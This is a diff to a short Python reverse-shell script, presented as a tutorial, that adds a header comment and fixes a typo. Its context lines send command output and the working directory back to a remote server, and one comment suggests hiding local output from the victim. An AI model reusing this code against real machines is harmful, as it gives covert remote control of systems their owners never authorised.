@@ -1,5 +1,8 @@
 #connects to server and waits fi instrucitons
-
+#author:johnjimy som
+#date: august 24, 2018
+#version: 0.0.1
+#objective: これはRSh Scriptのチュートリアルです. 
 
 import os #access the operating systems
 import socket #connect to serever
@@ -24,5 +27,5 @@ while True:
     s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
     print(output_str)#if ur hidoi hito dont print
 
-#   close conekktion
+#   close connection
 s.close()
